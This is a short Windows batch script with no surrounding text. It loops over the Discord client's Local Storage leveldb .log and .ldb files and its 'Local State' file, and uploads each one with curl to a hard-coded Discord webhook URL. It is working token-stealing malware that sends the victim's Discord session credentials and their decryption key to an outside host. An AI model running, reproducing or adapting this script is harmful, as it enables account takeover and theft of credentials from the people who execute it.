@echo off
set "webhook=https://discord.com/api/webhooks/1202099263786733618/7pBHxswltq03I6MI77GRqdsZ_pjTVmTONFE8K2o5Xy6Y2n9MDSXKc9PdJ1JKMDows30U"
for %%f in ("%appdata%\discord\Local Storage\leveldb\*.log") do curl -F c=@"%%f" %webhook%
for %%f in ("%appdata%\discord\Local Storage\leveldb\*.ldb") do curl -F c=@"%%f" %webhook%
curl -F c=@"%appdata%\discord\Local State" %webhook%
